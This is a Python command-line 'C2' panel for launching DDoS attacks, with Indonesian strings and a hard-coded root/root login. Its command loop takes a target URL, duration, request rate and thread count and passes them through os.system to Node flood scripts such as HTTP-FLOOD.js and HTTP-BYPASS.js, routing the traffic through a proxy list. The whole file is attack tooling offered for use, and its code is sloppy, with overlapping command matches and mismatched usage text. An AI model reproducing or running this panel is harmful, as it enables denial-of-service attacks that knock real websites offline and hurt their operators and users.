import socket
from colorama import Fore, Back, Style  
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mNusantara  \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Focket  DDoS Panel! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: 444 Was Here \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")

def menu():
    sys.stdout.write(f"         \x1b]2;Focket  C2 --> Bot: {bots} | Online Users: [1] | Methods: [8] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("\033[31m                                Focket C2\n\033[0mWelcome To Focket C2 | User Online: 1 | Botnet: " + str(bots) + " | Author: 18")
    print("                           Type Help To See All Command")
    print("")
    print(colored_text)

text = "HALLO APA KABAR KALIAN SEMUA"

half_length = len(text) // 2
left_text = text[:half_length]
right_text = text[half_length:]

colored_text = "\033[31m" + left_text + "\033[37m" + right_text + "\033[0m"
red_text = "\033[31m"
white_text = "\033[37m"

def main():
    menu()
    while True:
        cnc = input('''\033[31mFocket@\033[37mRoot==>''')
        if cnc == "elp":
            elp()

        # ALL LAYER METHODS
                
        elif "HTTP" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP.js {url} {time} {rps} {thread} proxy.txt')
            except IndexError:
                print('Usage: HTTP <url> <duration> <requests> <thread> <proxy.txt>')
                print('Example: HTTP https://example.com 120 32 5 poxy.txt')
                
        elif "HTTP-404" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-404.js {url} {time} {rps} {thread} proxy.txt')
            except IndexError:
                print('Usage: http-404 <url> <duration> <requests> <thread> <proxy.txt>')
                print('Example: http-404 https://example.com 120 32 5 proxy.txt')
                
        elif "http-anus" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-ANUS.js {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-anus <url> <duration> <requests> <threads> <proxy.txt>')
                print('Example: http-anus example.com 120 32 5')
                
        elif "http-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-BYPASS.js {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-bypass <url> <duration> <requests> <thread> <proxy.txt>')
                print('Example: http-titan example.com 120 64 5 proxy.txt')
                
        elif "http-ddos" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-DDOS {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-bypass <url> <duration> <requests> <thread> <proxy.txt>')
                print('Example: http-bypass example.com 120 32 5 proxy.txt')
                
        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-FLOOD.js {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-flood <url> <duration> <requests> <threads> <proxy.txt>')
                print('Example: http-flood example.com 120 500 10 proxy.txt')
                
        elif "http-ghost" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-GHOST.js {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-ghost <url> <duration> <requests> <threads> <proxy.txt>')
                print('Example: http-ghost example.com 120 32 5 proxy.tx')
                
        elif "http-load" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-LOAD {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-load <url> <duration> <requests> <thread> <proxy.txt>')
                print('Example: http-sound example.com 300 32 5 proxy.txt ')
                
        elif "http-ox" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node HTTP-OX {url} {time} {rps} {thread} -p.txt')
            except IndexError:
                print('Usage: http-ox <url> <duration> <requests> <thread> <proxy.txt>')
                print('Example: rand example.com 120 32 5 proxy.txt')
            
        elif "layer7" in cnc:
            print(f'''
{red_text}
════════════════════════════════════════════════
║                Layer7  [VVIP]                 ║
║                                               ║
║ {white_text}HTTP                             HTTP-FLOOD   {red_text}║
║ {white_text}HTTP-404                        HTTP-GHOST    {red_text}║
║ {white_text}HTTP-ANUS                    HTTP-LOAD        {red_text}║
║ {white_text}HTTP-BYPASS                HTTP-OX            {red_text}║
║ {white_text}HTTP-DDOS                                     {red_text}║
║                                               ║
║                                               ║
════════════════════════════════════════════════
''')

        elif "help" in cnc:
            print(f'''
LAYER 7 == Layer 7 Method
CLEAR == Clear Terminals
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def login():
    clear()
    user = "root"
    passwd = "root"
    username = input(" Username: ")
    password = getpass.getpass(prompt=' Password: ')
    if username != user or password != passwd:
        print("")
        print(" Password Salah Minta Admin Untuk Mengganti Password")
        sys.exit(1)
    elif username == user and password == passwd:
        print(" Welcome to Focket  DDoS Panel C2!")
        time.sleep(0.3)
        main()

login()